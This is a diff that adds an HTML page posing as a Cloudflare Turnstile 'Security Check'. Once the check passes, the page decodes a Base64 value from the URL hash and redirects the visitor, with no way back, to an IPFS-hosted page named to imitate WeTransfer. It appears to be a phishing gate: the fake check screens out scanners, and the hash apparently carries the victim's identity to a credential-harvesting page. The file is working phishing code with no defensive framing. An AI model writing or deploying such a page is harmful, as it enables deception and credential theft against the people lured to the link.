@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verifying…</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Cloudflare Turnstile -->
+  <script
+    src="https://challenges.cloudflare.com/turnstile/v0/api.js"
+    async
+    defer>
+  </script>
+
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0b0f19;
+      color: #e5e7eb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background: #020617;
+      padding: 28px;
+      border-radius: 12px;
+      text-align: center;
+      width: 320px;
+      box-shadow: 0 20px 40px rgba(0,0,0,.6);
+    }
+    h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h1>Security Check</h1>
+  <p>Please verify to continue</p>
+
+  <div
+    class="cf-turnstile"
+    data-sitekey="YOUR_TURNSTILE_SITE_KEY"
+    data-callback="onVerified">
+  </div>
+</div>
+
+<script>
+  function onVerified() {
+    try {
+      // Get Base64 value from URL hash
+      const encoded = location.hash.slice(1);
+      if (!encoded) return;
+
+      // Decode Base64
+      const decoded = atob(encoded);
+
+      // Redirect (no back button)
+      location.replace(
+        "https://wepresent_neuroawards_wetransfer-0w8j.ipfs.4everland.app/index.html#" +
+        encodeURIComponent(decoded)
+      );
+    } catch (e) {
+      // Silent fail
+    }
+  }
+</script>
+
+</body>
+</html>
